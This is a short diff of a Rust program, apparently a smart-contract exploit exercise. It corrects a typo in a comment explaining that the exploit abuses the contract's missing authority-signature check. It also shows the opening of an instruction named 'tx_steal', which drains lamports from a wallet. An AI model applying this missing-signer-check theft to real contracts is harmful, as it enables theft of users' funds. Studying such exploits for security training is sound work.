@@ -149,7 +149,7 @@ fn main() {
 
     /*
      We exploit the smart contract taking advantage that the Smart Contract doesn't Check the authority sign.
-     In this example, we are leafting enough lamports to keep the Wallet account on the Network
+     In this example, we are lefting enough lamports to keep the Wallet account on the Network
     */
 
     let tx_steal = Instruction {
